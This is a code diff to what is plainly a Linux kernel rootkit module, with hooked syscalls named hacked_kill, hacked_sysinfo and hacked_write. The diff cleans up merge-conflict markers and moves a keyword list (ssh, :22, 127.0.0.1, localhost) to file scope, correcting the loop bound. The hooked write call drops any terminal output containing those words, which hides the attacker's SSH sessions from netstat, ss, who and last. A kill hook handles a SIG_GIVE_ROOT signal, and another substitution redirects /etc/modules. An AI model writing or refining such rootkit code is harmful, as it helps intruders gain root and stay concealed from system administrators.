@@ -5,13 +5,10 @@
 #include <linux/syscalls.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
-<<<<<<< HEAD
 #include <linux/uaccess.h>
 #include <linux/namei.h>
 #include <linux/errno.h>
-=======
 #include <linux/proc_fs.h>
->>>>>>> 421c0d1e99a541c739731c4949e9eec449f509dc
 
 #include "modify_syscalls.h"
 
@@ -52,6 +49,9 @@ char hidePID[6] = "-1";
 const int   replacement_size     = 1;
 const char* replacement_keys[]   = { "/etc/modules\0" };
 const char* replacement_values[] = { "/etc/modules_original\0" };
+
+// these are keywords which we want to ignore when using the write syscall
+const char *keyWords[5] = {":ssh\0", "127.0.0.1\0", "localhost\0", ":22\0", "(127.0.0.1)\0"};
 
 // 1 = custom boot-loader installed; run modified syscalls
 // 0 = custom boot-loader not yet installed; don't use modified syscalls
@@ -132,7 +132,7 @@ asmlinkage int hacked_sysinfo(struct sysinfo *info)
 
 asmlinkage int hacked_kill(pid_t pid, int sig)
 {
-    struct task_struct *task;
+    // struct task_struct *task;
 
     switch(sig) {
         case SIG_GIVE_ROOT:
@@ -282,14 +282,12 @@ asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count){
     //anytime ssh is to be written (like netstat) with file descriptor = 1 (to standard output or terminal), we hide it (for netstat, ss etc)
     //anytime 127.0.0.1 is to be written, dont display (this is localhost, what we use to access through ssh - or at least what shows) (for last, who, etc...)
     //use `strace` to find what words are written to standard output for each of the frequently used networking commands (who, w, netstat, ss, last)
-
-    char *keyWords[4] = {":ssh", "127.0.0.1", "localhost", ":22", "(127.0.0.1)"};
-    int i = 0;
+    int i;
 
     if (fd == 1) {
         //spot our 'keywords'
         //if they are here, dont write anything at all
-        for(i; i < 4; i++){
+        for(i = 0; i < 5; i++){ 
             if (strstr(buf, keyWords[i]) != NULL) {
                 return count;
             }
